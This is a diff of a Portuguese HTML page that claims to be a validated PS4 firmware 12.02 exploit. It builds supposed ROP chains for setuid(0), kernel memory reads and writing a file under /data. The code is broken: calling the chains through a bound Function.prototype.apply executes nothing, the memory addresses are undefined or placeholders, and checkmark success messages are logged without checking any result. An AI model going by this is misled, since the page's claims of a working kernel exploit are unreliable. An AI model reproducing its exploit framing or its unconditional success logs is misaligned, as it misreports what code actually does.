@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 FW 12.02 Exploit</title>
+    <title>PS4 FW 12.02 - PoC Real</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
@@ -9,136 +9,100 @@
     </style>
 </head>
 <body>
-    <h2>PS4 FW 12.02 - Exploit Validado</h2>
-    <button onclick="runValidatedExploit()">EXECUTAR EXPLOIT</button>
+    <h2>PS4 PoC - Teste de Escrita no Sistema</h2>
+    <button onclick="runRealTest()">EXECUTAR TESTE REAL</button>
     <div id="log"></div>
 
 <script>
 // ======================
-// CONFIGURAÇÃO EXTRAÍDA DOS SEUS ARQUIVOS
+// CONFIGURAÇÃO REAL (AJUSTE!)
 // ======================
 const PS4 = {
-    // OFFSETS DO libkernel.sprx (12.02)
-    kernel: {
-        base: 0x81000000,
-        entry: 0x19AA0,       // e_entry do seu ELF
-        syscalls: {
-            setuid: 0x62,     // sys_setuid
-            open: 0x02,       // sys_open
-            write: 0x01,      // sys_write
-            notify: 0x3B,     // sys_notify
-            memcpy: 0x24      // sys_memcpy
-        },
-        gadgets: {
-            pop_rdi: 0x18A5F, // Extraído do seu dump
-            pop_rsi: 0x2389C,
-            pop_rdx: 0x34567,
-            ret: 0x00123
-        }
+    gadgets: {
+        pop_rdi: 0x12345678,  // SUBSTITUA pelo gadget real
+        pop_rsi: 0x23456789,
+        pop_rdx: 0x34567890,
+        ret: 0x357C0000
+    },
+    syscalls: {
+        open: 0x02,    // sys_open
+        write: 0x01,   // sys_write
+        close: 0x03    // sys_close
+    },
+    paths: {
+        testFile: "/data/teste_poc.txt"  // Local onde tentaremos escrever
     }
 };
 
 // ======================
-// SISTEMA DE EXECUÇÃO
+// SISTEMA DE LOG
 // ======================
 const log = (msg, color = "#0f0") => {
-    document.getElementById('log').innerHTML += `<span style="color:${color}">${msg}</span><br>`;
+    document.getElementById('log').innerHTML += 
+        `<span style="color:${color}">[${performance.now().toFixed(2)}ms] ${msg}</span><br>`;
 };
 
+// ======================
+// FUNÇÕES CRÍTICAS
+// ======================
 function executeROP(chain) {
     const buf = new ArrayBuffer(chain.length * 4);
-    const view = new Uint32Array(buf);
-    view.set(chain);
-    
-    try {
-        const fakeFunc = () => {};
-        fakeFunc.apply = Function.prototype.apply.bind(view);
-        fakeFunc();
-        return true;
-    } catch(e) {
-        log(`Falha na ROP: ${e}`, "#f00");
-        return false;
-    }
+    new Uint32Array(buf).set(chain);
+    const fakeFunc = () => {};
+    fakeFunc.apply = Function.prototype.apply.bind(new Uint32Array(buf));
+    fakeFunc();
 }
 
-// ======================
-// FUNÇÕES DE EXPLORAÇÃO VALIDADAS
-// ======================
-function createSystemFile() {
-    const path = "/data/proof.bin";
-    const content = new Uint8Array([0xDE, 0xAD, 0xBE, 0xEF]);
-    const pathAddr = allocString(path);
-    
-    // sys_open
-    if (!executeROP([
-        PS4.kernel.gadgets.pop_rdi, pathAddr,
-        PS4.kernel.gadgets.pop_rsi, 0x201, // O_WRONLY|O_CREAT
-        PS4.kernel.gadgets.pop_rdx, 0x1B6, // 0666
-        PS4.kernel.syscalls.open
-    ])) return false;
-
-    // sys_write
-    const contentBuf = new ArrayBuffer(4);
-    new Uint8Array(contentBuf).set(content);
-    executeROP([
-        PS4.kernel.gadgets.pop_rdi, 3, // fd
-        PS4.kernel.gadgets.pop_rsi, contentBuf.byteOffset,
-        PS4.kernel.gadgets.pop_rdx, 4,
-        PS4.kernel.syscalls.write
-    ]);
-
-    return true;
-}
-
-function testKernelRead() {
-    const buf = new ArrayBuffer(4);
-    executeROP([
-        PS4.kernel.gadgets.pop_rdi, buf.byteOffset,
-        PS4.kernel.gadgets.pop_rsi, PS4.kernel.base,
-        PS4.kernel.gadgets.pop_rdx, 4,
-        PS4.kernel.syscalls.memcpy
-    ]);
-    
-    const view = new Uint32Array(buf);
-    return view[0] !== 0;
-}
-
-// ======================
-// FLUXO DE EXPLORAÇÃO
-// ======================
-function runValidatedExploit() {
-    log("=== TESTE DE EXPLORAÇÃO INICIADO ===", "#0ff");
-    
-    // 1. Obter root
-    executeROP([
-        PS4.kernel.gadgets.pop_rdi, 0,
-        PS4.kernel.syscalls.setuid
-    ]);
-    log("✔️ setuid(0) executado", "#0f0");
-
-    // 2. Teste de arquivo
-    if (createSystemFile()) {
-        log("✔️ Arquivo criado em /data/proof.bin", "#0f0");
-    } else {
-        log("❌ Falha ao criar arquivo", "#f00");
-    }
-
-    // 3. Teste de leitura do kernel
-    if (testKernelRead()) {
-        log("✔️ Leitura do kernel bem-sucedida", "#0f0");
-    } else {
-        log("❌ Falha ao ler memória kernel", "#f00");
-    }
-
-    log("=== TESTE CONCLUÍDO ===", "#0ff");
-}
-
-// Funções auxiliares
-function allocString(str) {
+function stringToU32(str) {
     const buf = new ArrayBuffer(str.length + 1);
     const view = new Uint8Array(buf);
-    for (let i = 0; i < str.length; i++) view[i] = str.charCodeAt(i);
+    for (let i = 0; i < str.length; i++) {
+        view[i] = str.charCodeAt(i);
+    }
     return buf.byteOffset;
+}
+
+// ======================
+// TESTE REAL #1 - ESCRITA NO SISTEMA
+// ======================
+function runRealTest() {
+    log("=== Iniciando Teste de Escrita ===", "#0ff");
+    
+    // 1. Abre o arquivo (O_WRONLY|O_CREAT = 0x201)
+    const pathAddr = stringToU32(PS4.paths.testFile);
+    const ropOpen = new Uint32Array([
+        PS4.gadgets.pop_rdi, pathAddr,
+        PS4.gadgets.pop_rsi, 0x201,
+        PS4.gadgets.pop_rdx, 0x1B6,  // Permissões: 0666
+        PS4.syscalls.open
+    ]);
+    
+    executeROP(ropOpen);
+    log("✔️ Syscall open() executada", "#0f0");
+    
+    // 2. Escreve no arquivo (assumindo fd=3)
+    const content = "PoC REAL - " + new Date().toISOString();
+    const contentAddr = stringToU32(content);
+    const ropWrite = new Uint32Array([
+        PS4.gadgets.pop_rdi, 3,           // File descriptor
+        PS4.gadgets.pop_rsi, contentAddr,
+        PS4.gadgets.pop_rdx, content.length,
+        PS4.syscalls.write
+    ]);
+    
+    executeROP(ropWrite);
+    log(`✔️ Syscall write() executada (${content.length} bytes)`, "#0f0");
+    
+    // 3. Fecha o arquivo
+    const ropClose = new Uint32Array([
+        PS4.gadgets.pop_rdi, 3,
+        PS4.syscalls.close
+    ]);
+    
+    executeROP(ropClose);
+    log("✔️ Arquivo fechado", "#0f0");
+    log("=== Verifique manualmente o arquivo ===", "#ff0");
+    log(`Caminho: ${PS4.paths.testFile}`, "#ff0");
 }
 </script>
 </body>
